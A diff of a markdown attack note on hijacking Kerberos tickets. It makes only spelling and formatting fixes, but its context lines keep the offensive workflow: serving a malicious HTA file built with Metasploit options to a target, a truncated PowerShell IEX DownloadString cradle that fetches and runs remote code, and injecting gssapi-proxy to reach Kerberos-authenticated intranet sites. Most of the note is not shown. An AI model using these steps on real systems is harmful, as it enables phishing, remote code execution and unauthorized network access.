@@ -1,6 +1,6 @@
 # Hijacking Kerberose Tickets
 > Jacking kerberos tickets to remotely access the intranet.
-> The noted describe a process that is run from Kali
+> The note describes a process that is run from Kali
 
 1. Attacker creates a web page seving a malicous HTA file
 2. Target browses the attacker-sent web page & executes the served HTA file
@@ -12,7 +12,7 @@
 
 ## 1. Malicous HTA File
 
-1. Craft Malicous HTA File
+1. Craft Malicious HTA File
 
 ```bash
 service postgressql start
@@ -51,9 +51,9 @@ Older versions of msf use slightly different option flags.  Check the options fo
 
 This may work instead: `generate -t hta-psh -f /tmp/patch.hta`
 
-The `-t` was for output format but in `msf5>` it is `-f`
+The `-t` was for output *format* but in `msf5>` it is `-f`
 
-The `-f` was for output filename but in `msf5>` it is `-o`
+The `-f` was for output *filename* but in `msf5>` it is `-o`
 
 
 ## 2. HTA File is Executed
@@ -107,7 +107,7 @@ C:\Users\FrankCastle\> powershell "IEX (New-Object Net.WebClient).DownloadString
 > Check the `Data` feild and look for intranet locations.  They usually require kerberos authentication.
 
 ### 4.b Inject gssapi-proxy
- 
+
 Github location: [gssapi-proxy](https://github.com/mikkolehtisalo/gssapi-proxy)
 
 1. Elevate privilages
